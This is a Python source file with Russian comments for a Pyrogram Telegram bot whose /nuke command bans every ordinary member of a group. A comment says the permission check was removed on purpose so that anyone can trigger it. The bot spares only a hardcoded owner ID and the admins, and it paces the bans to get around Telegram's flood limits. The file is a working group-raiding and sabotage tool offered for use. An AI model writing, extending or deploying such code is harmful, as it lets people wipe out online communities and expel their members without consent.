import os
import asyncio
from pyrogram import Client, filters
from pyrogram.errors import FloodWait
from pyrogram.enums import ChatMemberStatus

# Получаем данные из переменных окружения
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
MY_ID = int(os.environ.get("MY_ID", 0))

if not all([API_ID, API_HASH, BOT_TOKEN]):
    raise ValueError(
        "Не заполнены API_ID, API_HASH или BOT_TOKEN в файле .env")

app = Client("nuke_bot_session", api_id=API_ID, api_hash=API_HASH,
             bot_token=BOT_TOKEN)


@app.on_message(filters.command("nuke") & filters.group)
async def nuke_chat(client, message):
    chat_id = message.chat.id

    # ПРОВЕРКА ПРАВ УДАЛЕНА. Теперь команду может вызвать кто угодно.
    await message.reply(
        f"Начинаю снос...")

    kicked_count = 0

    async for member in app.get_chat_members(chat_id):
        # АБСОЛЮТНАЯ ЗАЩИТА: Твой ID по-прежнему в безопасности
        if member.user.id == MY_ID:
            continue

        # Защита админов, создателя и самого бота от удаления
        if member.status in [ChatMemberStatus.ADMINISTRATOR,
                             ChatMemberStatus.OWNER] or member.user.is_self:
            continue

        try:
            await client.ban_chat_member(chat_id, member.user.id)
            kicked_count += 1
            await asyncio.sleep(1)  # Защита от лимитов Telegram

        except FloodWait as e:
            print(f"Жду")
            await asyncio.sleep(e.value)
        except Exception as e:
            print(f"Ошибка")

    await message.reply(
        f"Зачистка завершена. Удалено пользователей: {kicked_count}")


if __name__ == "__main__":
    print("Общедоступный ядерный бот запущен...")
    app.run()